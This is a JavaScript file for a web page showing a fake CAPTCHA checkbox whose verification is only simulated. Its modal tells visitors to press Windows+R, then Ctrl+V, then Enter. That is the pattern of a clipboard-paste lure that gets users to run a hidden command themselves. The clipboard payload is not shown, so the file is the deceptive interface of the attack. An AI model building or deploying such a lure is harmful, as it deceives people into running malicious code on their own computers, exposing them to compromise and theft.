document.addEventListener('DOMContentLoaded', function() {
    const captchaCheckbox = document.getElementById('captcha-checkbox');
    const modal = document.getElementById('verificationModal');
    const modalOverlay = document.getElementById('modalOverlay');
    const closeModalBtn = document.getElementById('closeModal');

    // Show modal when checkbox is clicked
    captchaCheckbox.addEventListener('change', function() {
        if (this.checked) {
            openModal();
            // Simulate normal verification delay
            setTimeout(() => {
                showVerificationComplete(true);
            }, 1200);
        }
    });

    // Close modal functions
    closeModalBtn.addEventListener('click', closeModal);
    modalOverlay.addEventListener('click', closeModal);

    function openModal() {
        modal.classList.add('active');
        modalOverlay.classList.add('active');
        document.body.style.overflow = 'hidden';
    }

    function closeModal() {
        modal.classList.remove('active');
        modalOverlay.classList.remove('active');
        document.body.style.overflow = '';
        captchaCheckbox.checked = false;
        restoreModalContent();
    }

    function showVerificationComplete(success) {
        const modalBody = modal.querySelector('.modal-body');
        modalBody.innerHTML = '';

        if (success) {
            const successMessage = document.createElement('div');
            successMessage.className = 'verification-success';
            successMessage.innerHTML = `
                <div class="success-icon">✓</div>
                <p>Verification successful!</p>
            `;
            modalBody.appendChild(successMessage);

            setTimeout(() => {
                closeModal();
            }, 1400);
        } else {
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error-message';
            errorDiv.textContent = 'Verification failed. Please try again.';
            modalBody.appendChild(errorDiv);
        }
    }

    function restoreModalContent() {
        modal.querySelector('.modal-body').innerHTML = `
            <div class="steps-container">
                <div class="step">
                    <div class="step-number">1</div>
                    <div class="step-text">Press Windows Button "<span class=\"windows-icon\">⊞</span>" + R</div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div class="step-text">Press CTRL + V</div>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <div class="step-text">Press Enter</div>
                </div>
            </div>
        `;
    }

    function showError(message) {
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.textContent = message;
        modal.querySelector('.modal-body').appendChild(errorDiv);
    }
});

// Keyboard shortcut to close modal (ESC key)
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        const modal = document.getElementById('verificationModal');
        if (modal.classList.contains('active')) {
            modal.classList.remove('active');
            document.getElementById('modalOverlay').classList.remove('active');
            document.body.style.overflow = '';
            document.getElementById('captcha-checkbox').checked = false;
        }
    }
});

